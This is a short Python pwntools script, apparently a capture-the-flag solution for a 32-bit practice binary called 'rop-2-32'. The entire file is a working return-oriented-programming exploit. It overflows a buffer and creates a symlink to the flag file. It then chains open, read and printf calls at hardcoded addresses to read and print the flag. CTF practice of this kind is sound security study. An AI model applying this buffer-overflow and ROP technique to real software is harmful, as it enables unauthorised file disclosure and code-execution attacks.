#!/usr/bin/env python

from pwn import *
import os

p = process("./rop-2-32")

buf = "A" * 0x88 + "BBBB"

pop_esi_pop_edi_pop_ebp_ret = p32(0x08048689)

string = p32(0x80485ca)

if os.path.exists("\x01"):
    os.unlink("\x01")
os.symlink("flag","\x01");

 #  open("flag", 0, 0);
ope = p32(0x080483b0)
buf += ope
buf += pop_esi_pop_edi_pop_ebp_ret
buf += string
buf += p32(0)
buf += p32(0)

# read(3, global_variable_addr, size);
read = p32(0x08048380)
printf = p32(0x08048390)
buf += read
buf += printf
buf += p32(3)
buf += p32(0x804a800)
buf += p32(100)

with open('test','wb')as f:
        f.write(buf);

p.sendline(buf)
p.interactive()